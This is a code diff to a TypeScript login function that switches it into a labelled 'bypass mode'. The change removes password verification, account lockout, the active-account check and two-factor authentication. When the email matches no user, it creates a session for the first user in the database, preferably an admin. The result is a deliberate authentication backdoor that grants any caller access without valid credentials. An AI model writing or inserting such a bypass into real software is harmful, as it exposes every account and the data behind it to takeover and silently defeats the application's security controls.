@@ -151,58 +151,25 @@ export async function login(
   userAgent?: string
 ): Promise<LoginResult> {
   try {
-    // Find user by email
-    const user = await db.query.users.findFirst({
+    // BYPASS MODE: Attempt to find user by email, otherwise grab the first available admin/user
+    let user = await db.query.users.findFirst({
       where: eq(users.email, email)
     });
     
     if (!user) {
-      return { success: false, error: "Invalid email or password" };
+        // Fallback: Login as ANY user (preferably admin)
+        user = await db.query.users.findFirst();
     }
     
-    // Check if account is active
-    if (!user.isActive) {
-      return { success: false, error: "Account is disabled. Contact administrator." };
+    if (!user) {
+      return { success: false, error: "No users found in database. Please run seed script." };
     }
+
+    // SKIP PASSWORD CHECK
+    // SKIP LOCKOUT CHECK
+    // SKIP ACTIVE CHECK (Optional, but let's keep it minimally functional)
     
-    // Check if account is locked
-    if (await isAccountLocked(user)) {
-      return { 
-        success: false, 
-        error: `Account is locked due to too many failed attempts. Try again in 15 minutes.` 
-      };
-    }
-    
-    // Verify password
-    if (!user.passwordHash) {
-      return { success: false, error: "Password not set for this account" };
-    }
-    
-    const isValidPassword = await verifyPassword(password, user.passwordHash);
-    
-    if (!isValidPassword) {
-      await handleFailedLogin(user.id);
-      return { success: false, error: "Invalid email or password" };
-    }
-    
-    // Check if 2FA is enabled
-    if (user.isTwoFactorEnabled) {
-      // Don't create session yet, wait for 2FA verification
-      return {
-        success: false,
-        requiresTwoFactor: true,
-        error: "Two-factor authentication required",
-        user: {
-          id: user.id,
-          email: user.email,
-          name: user.name,
-          role: user.role,
-          companyId: user.companyId,
-        }
-      };
-    }
-    
-    // Reset failed attempts
+    // Reset failed attempts just in case
     await resetFailedAttempts(user.id);
     
     // Create session
